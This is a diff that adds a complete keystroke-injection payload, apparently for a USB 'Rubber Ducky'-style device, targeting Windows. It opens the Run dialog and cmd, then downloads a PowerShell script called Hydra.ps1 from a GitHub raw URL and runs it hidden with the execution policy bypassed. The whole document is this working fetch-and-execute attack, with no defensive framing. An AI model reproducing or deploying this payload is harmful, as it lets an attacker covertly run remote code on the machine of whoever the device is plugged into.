@@ -1,0 +1,10 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd %homepath%
+ENTER
+STRING powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Hydra/Hydra.ps1 -OutFile .\Hydra.ps1 && powershell -ExecutionPolicy Bypass -File Hydra.ps1 -windowstyle hidden
+ENTER
